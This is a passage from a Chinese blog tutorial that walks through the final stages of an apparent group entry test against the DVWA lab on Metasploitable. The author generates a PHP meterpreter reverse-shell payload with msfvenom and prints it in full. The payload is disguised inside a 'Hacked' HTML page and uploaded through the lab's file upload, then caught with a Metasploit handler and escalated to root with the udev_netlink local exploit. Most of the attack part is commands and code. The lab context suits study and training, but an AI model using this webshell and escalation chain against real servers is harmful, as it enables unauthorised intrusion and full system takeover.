<h4 id="生成木马">生成木马</h4>
<p>我们用 <strong><code>msfvenom</code></strong> 这个命令来生成。执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.106 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o test.php
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这样就生成好了。来看看里面有什么？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只有一行～！这一行就是嘿嘿。。。自己看啦</p>
<p>我们加一些html上去吧:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;meta charset=&#34;utf-8&#34; /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;h1&gt;Hacked&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>接下来回到DVWA，在左下角点击 <strong><code>upload</code></strong> 进入上传页面，然后点击 <strong><code>选择文件</code></strong> 再点击 <strong><code>upload</code></strong> 即可。</p>
<p>将这个文件上传进去。</p>
<p>如果这都不会我就不多说了，<strong>你连上传个文件都不会还想进锏幕？</strong></p>
<p></p>
<p>然后我们可以看到这么一串东西。</p>
<p><strong><code>../../hackable/uploads/test.php succesfully uploaded!</code></strong></p>
<p>说明你上传成功了，接下来要用到<strong>msf</strong></p>
<p>我们在终端进入msf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>不多讲了，走个命令流程，之前写过</p>
<p>调用模块:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler
</span></span></code></pre></td></tr></table>
</div>
</div><p>按顺序执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 192.168.0.106
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行完后，如图:</p>
<p></p>
<p>接下来，我们会到浏览器，直接访问<code>http://192.168.0.105/dvwa/hackable/uploads/test.php</code></p>
<p>这时，msf会收到反弹，如图:</p>
<p></p>
<p></p>
<p>可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决</p>
<h3 id="第四关获取root权限">第四关|获取root权限</h3>
<p>你能做到这里说明你已经不是萌新了，最后一关：提权</p>
<p>这是最关键的一环，那么我们开始吧。</p>
<p>首先把我们刚刚获取的webshell放到后台:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; background
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们使用这个模块<code>exploit/linux/local/udev_netlink</code>(用别的也可以，我个人喜欢用这个:)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/linux/local/udev_netlink
</span></span></code></pre></td></tr></table>
</div>
</div><p>模块的信息你可以自己输入 <strong><code>info</code></strong> 这个命令去查看，</p>
<p>然后我们设置刚刚webshell的session号，我的是2:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样我们就获取到最高权限了，如图:</p>
<p></p>
<p>我们来看看用户是不是root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span></code></pre></td></tr></table>
</div>
</div><p>或</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami
</span></span></code></pre></td></tr></table>
</div>
</div><p>如图</p>
<p></p>
<p>然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。</p>
<hr>
<h2 id="结语">结语</h2>
<p>写了一个礼拜，全是即操作即写</p>
<p>看完还不会的，，，在下面留言吧..</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">ArchWiki</a></p>
</li>
<li>
<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreffer">Metasploitable下载地址</a></p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/av59729967" target="_blank" rel="noopener noreffer">由帝的sqlmap视频</a></p>
</li>
</ul>
<hr>
<p><strong>注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关</strong></p>
]]></description>
</item></channel>
</rss>
